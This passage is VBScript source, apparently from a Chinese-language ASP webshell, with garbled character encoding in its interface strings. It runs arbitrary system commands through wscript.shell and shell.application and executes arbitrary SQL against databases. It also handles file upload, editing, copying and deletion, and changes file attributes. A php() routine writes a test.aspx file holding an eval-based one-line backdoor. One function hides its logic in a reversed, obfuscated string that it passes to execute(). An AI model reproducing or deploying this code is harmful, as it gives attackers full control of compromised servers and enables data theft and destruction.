si=si&rp1&"shell.application"">shell.application"
si=si&rp1&"shell.application.1"">shell.application.1"
si=si&"<input name='cmd' style='width:92%' value='"&defcmd&"'> <input type='submit' value='ִ��'>"

set fso=server.createobject("scripting.filesystemobject")
sztempfile = rwpath&"\cmd.txt"
select case request("cmdtype")
case "wscript"		
set cm=server.createobject("wscript.shell")
set dd=cm.exec(shellpath&" /c "&defcmd)
aaa=dd.stdout.readall
si=si&"<text"&"area style='width:100%;height:440;' class='cmd'>"
si=si&aaa
si=si&chr(13)&"</text"&"area></form>"
case "wscript.shell","wscript.shell.1"
on error resume next
set ws=server.createobject(request("cmdtype"))
call ws.run (shellpath&" /c " & defcmd & " > " & sztempfile, 0, true)
set ofilelcx = fso.opentextfile (sztempfile, 1, false, 0)
aaa=server.htmlencode(ofilelcx.readall)
ofilelcx.close
call fso.deletefile(sztempfile, true)
si=si&"<text"&"area style='width:100%;height:440;' class='cmd'>"
si=si&aaa
si=si&chr(13)&"</text"&"area></form>"
case "shell.application","shell.application.1"
set seshell=server.createobject(request("cmdtype"))

seshell.ShellExecute shellpath," /c " & defcmd & " > " & sztempfile,"","open",0
si=si&"<iframe id=cmdResult src='?cmdtype=shellresult&Action=Cmd1Shell' style='width:100%;height:440;'>"
case "shellresult"
response.Clear()
on error resume next
j "<body style=""background:#000000""><span style=""color:#FFFFFF"">"
if fso.fileexists(sztempfile)=true then
set ofilelcx = fso.opentextfile (sztempfile, 1, false, 0)
ss=server.htmlencode(ofilelcx.readall)
ss=replace(ss,vbnewline,"<br>")
j ss
ofilelcx.close
call fso.deletefile(sztempfile, true)
else
j "<meta http-equiv=""refresh"" content=""1"" />����δ����������û��ִ�гɹ����ȴ�ˢ������"
end if
if err then j "<meta http-equiv=""refresh"" content=""1"" />����δ����������û��ִ�гɹ����ȴ�ˢ������"
j"</span></body>"
response.end
end select
j si
set fso=nothing
end function:
Function TSearch():dim st:st=timer():RW="<br><table width='600' bgcolor='' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor=''>��������</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;·&nbsp;&nbsp;����<input name='SFpath' value='" & WWWRoot & "' style='width:390'>&nbsp;ע:��·��ʹ��"",""������.</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;�ļ�����<input name='Sfk' style='width:200'>&nbsp;<input type='submit' value='����' class='submit'>&nbsp;[����Ҳ��]</td></tr>"  
  RW=RW & "</form></table>"
  j RW : RW=""
  if Request.Form("Sfk")<>"" then
  Set newsearch=new SearchFile
  newsearch.Folders=trim(Request.Form("SFpath"))
  newsearch.keyword=trim(Request.Form("Sfk"))
  newsearch.Search
  Set newsearch=Nothing
  j"�M�r��"&(timer()-st)*1000&"����<hr>"
  end if
End Function 
Class SearchFile
 dim Folders,keyword,objFso,Counter
 Private Sub Class_Initialize
  Set objFso=Server.CreateObject(ObT(0,0))
  Counter=0
 End Sub
 Private Sub Class_Terminate
    Set objFso=Nothing
 End Sub
 Function Search
  Folders=split(Folders,",")
  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  if flag then
    j"<table align='center' width='600'><hr><p align='center'><font color='red'>�P�I�ֲ��ܰ���/\:|&</font><br>"
 Exit Function
  else
    j"<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  j"<p align='center'>��������<font color='red'>"&Counter&"</font>���Y��<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function
 Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color=''>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  j OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class
sub SavePower(PowerPath,SaveType):Set theFile = fsoX.GetFile(PowerPath):if SaveType=1 then:theFile.Attributes=32:j "<script language='javascript'>alert('�ļ��ѳɹ�������');window.opener.location.reload();window.close();</script>":else:theFile.Attributes=7:j "<script language='javascript'>alert('�ļ������ɹ���');window.opener.location.reload();window.close();</script>":end if:Set theFile = Nothing:end sub:sub EditPower(PowerPath):PowerPath=replace(PowerPath,"""",""):Set theFile = fsoX.GetFile(PowerPath):j getMyTitle(theFile,PowerPath):Set theFile = Nothing:end sub:Function getMyTitle(theOne,PowerPath):Dim strTitle:strTitle = strTitle & "<br>·��: " & theOne.Path & "" :strTitle = strTitle & "<br>��С: " & getTheSize(theOne.Size) :strTitle = strTitle & "<br>����ʱ��: " & theOne.DateCreated :strTitle = strTitle & "<br>����޸�: " & theOne.DateLastModified:strTitle = strTitle & "<br>������: " & theOne.DateLastAccessed:strTitle = strTitle & "<br>��ǰȨ��״̬: " & getAttributes(theOne.Attributes,PowerPath):getMyTitle = strTitle:End Function::Function getAttributes(intValue,PowerPath):Dim EditOK:EditOK=1:If intValue >= 128 Then:intValue = intValue - 128:End If:If intValue >= 64 Then:intValue = intValue - 64:End If:If intValue >= 32 Then:intValue = intValue - 32:End If:If intValue >= 16 Then:intValue = intValue - 16:End If:If intValue >= 8 Then:intValue = intValue - 8:End If:If intValue >= 4 Then:intValue = intValue - 4:EditOK=0:End If:If intValue >= 2 Then:intValue = intValue - 2:EditOK=0:End If:If intValue >= 1 Then:intValue = intValue - 1:EditOK=0:End If:PowerPath=replace(PowerPath,"\","\\"):if EditOK=0 then :getAttributes = "<font color=red>������</font> <input type=button value=���� onclick=""location.href='?Action=SavePower&SaveType=1&PowerPath="&PowerPath&"'"">":else:getAttributes = "<font color=#62FF62>δ����</font> <input type=button value=���� onclick=""location.href='?Action=SavePower&SaveType=2&PowerPath="&PowerPath&"'"">":end if:End Function:Function getTheSize(theSize):If theSize >= (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G":end if:If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M":end if:If theSize >= 1024 And theSize < (1024 * 1024) Then :getTheSize = Fix((theSize / 1024) * 100) / 100 & "K":end if:If theSize >= 0 And theSize <1024 Then :getTheSize = theSize & "B":end if:End Function:function openUrl(usePath):Dim theUrl, thePath:thePath = Server.MapPath("/"):If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then:theUrl = Mid(usePath, Len(thePath) + 1):theUrl = Replace(theUrl, "\", "/"):If Left(theUrl, 1) = "/" Then:theUrl = Mid(theUrl, 2):End If:openUrl="/"&theUrl&""" target=""_blank":Else:openUrl="###"" onclick=""alert('�ļ�����վ��Ŀ¼�¡�')":End If:End function
Function ScReWr(folder)
on error resume next 
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject("Scripting.FileSystemObject")
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = "<span style='font-size:11px;'>��</span><font face='webdings' size='1' color=yellow>x</font> "
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span><font face='webdings' size='1' color=yellow>x</font> "
Else
ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span>�� "
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = "<span style='font-size:11px;'>��</span>�� "
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span><font face='webdings' size='1' color=yellow>x</font> "
Else
ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span>�� "
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
function php()

On Error Resume Next
set fso=Server.CreateObject(oBt(0,0))
fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo��_��oo'?><?php phpinfo()?>"
fso.CreateTextFile(server.mappath("test.jsp")).Write"Jsp Test oo��_��oo"
fso.CreateTextFile(server.mappath("test.aspx")).Write""&chr(60)&"%@ Page Language=""Jscript"" validateRequest=""false"" "&chr(37)&""&chr(62)&""&chr(60)&""&chr(37)&"Response.Write(eval(Request.Item[""w""],""unsafe""));"&chr(37)&""&chr(62)&"aspx Test oo��_��oo":
j"<center><iframe src=test.php width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; <iframe src=test.jsp width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; <iframe src=test.aspx width=300 height=100></iframe>&nbsp;&nbsp;&nbsp; </center><br><br><p><br><p><br><br><p><br><center>̽��������Ƿ�֧�������ű�<p></font><p><a href='?Action=apjdel'><font size=5 color=red><b>(ɾ�������ļ�!)</b></font></a></center><tr><td height='20'><center>"
End function
On Error Resume Next
function apjdel():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("test.aspx")):On Error Resume Next:fso.DeleteFile(server.mappath("test.php")):On Error Resume Next:fso.DeleteFile(server.mappath("test.jsp")):On Error Resume Next:j"test.(aspx;php;jsp)ɾ�����!":set fso=nothing:End function
Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'>  ���ݿ����Ӵ�:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  SI=SI&"<option value=1>MsSql����</option><option value=2>MySql����</option><option value=3>DSN����</option>"
  SI=SI&"<option value=-1>--SQL�﷨--</option><option value=4>��ʾ����</option><option value=5>�������</option>"
  SI=SI&"<option value=6>ɾ������</option><option value=7>�޸�����</option><option value=8>�����ݱ�</option>"
  SI=SI&"<option value=9>ɾ���ݱ�</option><option value=10>����ֶ�</option><option value=11>ɾ���ֶ�</option>"
  SI=SI&"<option value=12>��ȫ��ʾ</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'> SQL��������:</td>"
  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  j SI:SI=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
If Rs("TABLE_TYPE")="TABLE" then
  TName=Rs("TABLE_NAME")
  SI=SI&"<td align=center><a href=""javascript:if(confirm('ȷ��ɾ��ô��'))FullSqlStr('DROP TABLE ["&TName&"]',1)"">[ del ]</a><br>"
  SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
End If 
Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  j SI:SI=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
SI=SI&"ִ����䣺"&SqlStr
Set Rs=CreateObject("Adodb.Recordset")
Rs.open SqlStr,Conn,1,1
FN=Rs.Fields.Count
RC=Rs.RecordCount
Rs.PageSize=20
Count=Rs.PageSize
PN=Rs.PageCount
Page=request("Page")
If Page<>"" Then Page=Clng(Page)
If Page="" Or Page=0 Then Page=1
If Page>PN Then Page=PN
If Page>1 Then Rs.absolutepage=Page
SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"  
For n=0 to FN-1
  Set Fld=Rs.Fields.Item(n)
  SI=SI&"<td align='center'>"&Fld.Name&"</td>"
  Set Fld=nothing
Next
SI=SI&"</tr>"
Do While Not(Rs.Eof or Rs.Bof) And Count>0
  Count=Count-1
  Bgcolor="#EFEFEF"
  SI=SI&"<tr><td><font face='wingdings'>x</font></td>"  
  For i=0 To FN-1

If RC=1 Then
ColInfo=HTMLEncode(Rs(i))
Else
ColInfo=HTMLEncode(Left(Rs(i),50))
End If
SI=SI&"<td bgcolor=006300>"&ColInfo&"</td>"
  Next
  SI=SI&"</tr>"
  Rs.MoveNext
Loop
j SI:SI=""
SqlStr=HtmlEnCode(SqlStr)
SI=SI&"<tr><td colspan="&FN+1&" align=center>��¼����"&RC&" ҳ�룺"&Page&"/"&PN
If PN>1 Then
  SI=SI&"  <a href='javascript:FullSqlStr("""&SqlStr&""",1)'>��ҳ</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>��һҳ</a> "
  If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
  For i=Sp To Sp+8
If i>PN Then Exit For
If i=Page Then
SI=SI&i&" "
Else
SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a> "
End If
  Next
  SI=SI&" <a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>��һҳ</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>βҳ</a>"
End If
SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
Rs.Close:Set Rs=Nothing
j SI:SI=""
  Else
Conn.Execute(SqlStr)
SI=SI&"SQL��䣺"&SqlStr
  End If
  j SI:SI=""
End If
  Conn.Close
  Set Conn=Nothing
  End If
End Function
Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
  DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
  T2.Type = 1 : T2.Mode =3 : T2.Open
  T1.Position = DStart
  T1.CopyTo T2,DIEnd-DStart
  T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
  TIn = T2.ReadText : T2.Close
  DStart = InStrB(DIEnd,TDa,TSt)
  FStart = InStr(22,TIn,"name=""",1)+6
  FEnd = InStr(FStart,TIn,"""",1)
  UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
  if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
  D2.add UpName,TFL
end if
  else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
  D1(UpName)=D1(UpName)&", "&SFV
else
  D1.Add UpName,SFV
end if
  end if
  DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
  End Sub
  Private Sub Class_Terminate
if Request.TotalBytes>0 then
  D1.RemoveAll:D2.RemoveAll
  set D1=nothing:set D2=nothing
  T1.Close:set T1 =nothing
end if
  End Sub
End Class
fns=126
Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
 T3.Mode=3 : T3.Type=1 : T3.Open
 T1.position=FileStart
 T1.copyto T3,FileSize
 T3.SaveToFile F,2
 T3.Close
 set T3=nothing
 SaveAs=false
end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
  End Sub

  Private Sub Class_Terminate
Set CF=Nothing
  End Sub
Function ShowDriver()
For Each D in CF.Drives
  j cdx&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>&nbsp���ش��� ("&D.DriveLetter&":)</a><br></td></tr>" 
Next
  End Function
Function IsIco(ia,ib,ta)
	If ShowFileIco=true Then
      IsIco = " <img src='"&IcoPath&ia&"'> "
	  If ib<>"" Then
	  IsIco = "<img src='"&IcoPath&ib&"'> "
	  End If
	Else
	  IsIco = "&nbsp;<font face='wingdings' color='#dddddd' size='6'>"&ta&"</font>"
	End If
End Function
Function FileIco(FName)
  If ShowFileIco=true Then
    TypeList =  ".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml.zip.jsp.aspx.;"
    FileType = lcase(Mid(FName, InstrRev(FName,".")+1))
    If Instr(TypeList,"."&FileType)>0 then
      Ico = FileType&".gif"
    Else
      Ico = "default.gif"
    End If

    FileIco = "<img src='#dddddd' border='0'> "
  Else 
    FileIco=""
  End If
End Function
Function Show1File(Path)
execute(shisanfun("fi dne��esle��gnihtoN=DLOF teS���>elbat/<��&IS j��txeN��fi dne��fi dne���ko��=)emaN.L(noisses��neht ��ko�� >< )emaN.L(noisses fi��neht ��ko��=)��tcA��(tseuqer fi��1+i=i���>rt/<>dt/<��&)��-��,��/��,deifidoMtsaLetaD.L(ecalper j����>dt<>dt/<>a/<evoM>'����'=eltit 'ma'=ssalc ')���eliFevoM���,����&)emaN.L&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a< >a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')���eliFypoC���,����&)emaN.L&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a< >a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno  ')���eliFleD���,����&)emaN.L&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a< �� j���)��&setubirtta.l&��(�� j�� fi dne���̩�j��esle���>tnof/<x>der=roloc '1'=ezis 'sgnidbew'=ecaf tnof<��j��neht 0=KOOtidE fi��fI dnE��0=KOOtidE:1 - VOOtidE = VOOtidE��nehT 1 => VOOtidE fI��fI dnE��0=KOOtidE:2 - VOOtidE = VOOtidE��nehT 2 => VOOtidE fI��fI dnE��0=KOOtidE:4 - VOOtidE = VOOtidE��nehT 4 => VOOtidE fI��fI dnE��8 - VOOtidE = VOOtidE��nehT 8 => VOOtidE fI:fI dnE��61 - VOOtidE = VOOtidE��nehT 61 => VOOtidE fI��fI dnE��23 - VOOtidE = VOOtidE��nehT 23 => VOOtidE fI��fI dnE��46 - VOOtidE = VOOtidE��nehT 46 => VOOtidE fI��fI dnE��821 - VOOtidE = VOOtidE��nehT 821 => VOOtidE fI��setubirttA.l=VOOtidE��1=KOOtidE��KOOtidE miD���>a/<��Ȩ>'��Ȩ'=eltit 'ma'=ssalc '###'=ferh ���)'002=thgieh,003=htdiw,0=elbaziser,0=srabllorcs,0=rabunem,0=sutats,0=seirotcerid,0=noitacol,0=rabloot','rewoPtidE','��&)emAn.L&��\��&hTaP(htApeR&��=htaPrewoP&rewoPtidE=noitcA?'(nepo.wodniw���=kcilcno a<�� j��� >a/<tidE>'����'=eltit 'ma'=ssalc ')���eliFtidE���,����&)emaN.L&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a<�� j��� >a/<nepO>'���Ŀ���lrU��ͨ'=eltit 'ma'=ssalc ����&)emAn.L&��\��&hTaP(lrUnepo&����=ferh a<�� j��fi dne���>dT<>dt/<��&epyT.L&��>dT<>dt/<K��&)4201/ezis.L(gnlc&��>dT<>a/<��&emaN.L&��  >'����'=eltit ';)���eliFnwoD���,����&)emaN.L&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a<�� j��esle���>dT<>dt/<��&epyT.L&��>dT<>dt/<K��&)4201/ezis.L(gnlc&��>dT<>a/<>tnof/<)����Ҫ�ػ�ҳ��( ��&)emaN.L(esacl&�� >der=roloc tnof< >'����'=eltit ';)���eliFnwoD���,����&))emaN.L(esacl&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a<�� j��nehT  0>)��gifnoc��,)emaN.L(esacl(rtsnI ro 0>)��nnoc��,)emaN.L(esacl(rtsnI ro 0>)��tluafed��,)emaN.L(esacl(rtsnI ro 0>)��xedni��,)emaN.L(esacl(rtsnI fiesle���>dT<>dt/<��&epyT.L&��>dT<>dt/<K��&)4201/ezis.L(gnlc&��>dT<>a/<>tnof/<)��ȷ��,���ķ������ܿ�( ��&emaN.L&�� >wolley=roloc tnof< >'����'=eltit ';)���eliFnwoD���,����&)emaN.L&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a<�� j�� nehT 0>)��kcah��,)emaN.L(esacl(rtsnI ro 0>)��amum��,)emaN.L(esacl(rtsnI ro 0>)��igc.��,)emaN.L(esacl(rtsnI ro ��psa.nooc��=)emaN.L(esacl ro 0>)��nooc��,)emaN.L(esacl(rtsnI ro 0>)��nmoc��,)emaN.L(esacl(rtsnI ro 0>)��otcudorp��,)emaN.L(esacl(rtsnI ro 0>)��P0T��,)emaN.L(esacu(rtsnI ro  0>)��rth.��,)emaN.L(esacl(rtsnI ro 0>)��xdc.��,)emaN.L(esacl(rtsnI ro 0>)��rec.��,)emaN.L(esacl(rtsnI ro 0>)��asa.��,)emaN.L(esacl(rtsnI ro 0>)��;��,emaN.L(rtsnI fi��)emaN.L(ocIeliF j���>'02'=thgieh dt<>���'212121#'=roloCdnuorgkcab.elyts.siht���=tuOesuoMno ���'969696#'=roloCdnuorgkcab.elyts.siht���=revOesuoMno ���212121#:roloc-dnuorgkcab���=elyts rt<��j���selif.dloF ni L hcaE roF����>dt/<>dt<>dt/<>b/<deifidoM tsaL>x=di b<>s=di dt<>dt/<>b/<gnitarepO>x=di b<>s=di dt<>dt/<>b/<epyT>x=di b<>s=di dt<>dt/<>b/<eziS>x=di b<>22=thgieh s=di dt<>dt/<>b/<emaneliF>x=di b<>s=di dt<>rt<>retnec=ngila '%001'=htdiw elbat<��j��0=i:���=IS : ���& IS j���>elbat/<>rt/<>dt/<>2=thgieh dt<>rt<>rt/<��&IS=IS��txeN���>rt<>rt/<��&IS=IS neht 0=6 dom i fI��1+i=i���>dt/<>vid/< >a/<evoM>'����'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno ')���redloFevoM���,����&)emaN.F&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a< >a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno ')���redloFleD���,����&)��\\��,��\��,emaN.F&��\��&htaP(ecalpeR&����(mroFlluF:tpircsavaj'=ferh a< >a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno  ')���redloFypoC���,����&)emaN.F&��\��&htaP(htaPeR&����(mroFlluF:tpircsavaj'=ferh a<>rb<>a/<��&emaN.F&��>rb<��&)��0��,��fig.redlof��,���(ocIsI&��>���������=eltit ')����&)emaN.F&��\��&htaP(htaPeR&����(redloFwohS:tpircsavaj'=ferh a<��&is=is���>'xp4:mottob-gniddap;838383# dilos xp1:redrob'=elyts vid<>retnec=ngila %71=htdiw 01=thgieh dt<��&IS=IS��sredlofbus.DLOF ni F hcaE roF���>retnec/<>a/<>b/<ҳ�ϻط�>b<>'emarFeliF'=tegrat 'kcabog=noitcA?'=ferh a<>retnec<�� j�� ��>rt<>'6'=gniddapllec '0'=gnicapsllec '0'=redrob '%001'=htdiw elbat<��=IS��0=i��)htaP(redloFteG.FC=DLOF teS��neht 8=))111(rhc,pth(rtsni fi"))
End function:
Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>��ϲ���ļ� "&Path&" ɾ���ɹ���</center>"
SI=SI&BackUrl
j SI
End If
End Function

function ReadFromTextFile (FileUrl,CharSet) 
dim str 
set stm=server.CreateObject("adodb.stream") 
stm.Type=2
stm.mode=3 
stm.charset=CharSet 
stm.open 
stm.loadfromfile FileUrl 
str=stm.readtext 
stm.Close 
set stm=nothing 
ReadFromTextFile=str 
end function
Sub WriteToTextFile (FileUrl,byval Str,CharSet) 
set stm=server.CreateObject("adodb.stream") 
stm.Type=2
stm.mode=3 
stm.charset=CharSet 
stm.open 
stm.WriteText str 
stm.SaveToFile FileUrl,2 
stm.flush 
stm.Close 
set stm=nothing 
end Sub 
Function EditFile(Path)
If Request("Action2")="Post" Then
WriteToTextFile Path,Request.form("content"),AChar
SI="<center><br><br><br>��ϲ���ļ�����ɹ���</center>"
SI=SI&BackUrl
j SI
if request("id1")=1 then j"<iframe width=0 src=?Action=SavePower&SaveType=2&PowerPath=\\.\"&path&"></iframe>"
Response.End
End If
Dim GBcheck,UTcheck
GBcheck=" checked"
UTcheck=""
If AChar="UTF-8" Then 
GBcheck=""
UTcheck=" checked"
End If
If Path<>"" Then
Txt=ReadFromTextFile(Path,AChar)
Else
Path=Session("FolderPath")&"\newfile.asp":Txt="hello world!"
End If
j "<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
j"<input name='Action' value='EditFile' Type='hidden'>"
j"<input name='FName' value='"&Path&"' style='width:100%'><br>"
j"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br><hr>"
j"<input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;"
j"<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;"
j"<input id=all type=radio name=AChar value=""GB2312"""&GBcheck&" onClick=""javascript:location.href='?Fname="&server.urlencode(Path)&"&Action=EditFile&AChar=GB2312'""/>GB2312   <input id=all type=radio name=AChar value=""UTF-8"""&UTcheck&" onClick=""javascript:location.href='?Fname="&server.urlencode(Path)&"&Action=EditFile&AChar=UTF-8'""/>UTF-8  &nbsp;ע��������ֻ�ڱ༭�ļ�ʱ����|&nbsp;&nbsp;&nbsp;"
j"<input type=""checkbox"" name=""id1"" value=1 />����&nbsp;"
j"<input name='submit' type='submit' value='Save'></form>"
End Function

:Function CopyFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.CopyFile Path(0),Path(1)
SI="<center><br><br><br>��ϲ���ļ�"&Path(0)&"���Ƴɹ���</center>"
SI=SI&BackUrl
j SI 
End If
End Function
Function MoveFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.MoveFile Path(0),Path(1)
SI="<center><br><br><br>��ϲ���ļ�"&Path(0)&"�ƶ��ɹ���</center>"
SI=SI&BackUrl
j SI 
End If
End Function
Function DelFolder(Path)
If CF.FolderExists(Path) Then
CF.DeleteFolder Path
SI="<center><br><br><br>��ϲ��Ŀ¼"&Path&"ɾ���ɹ���</center>"
SI=SI&BackUrl
End If
End Function
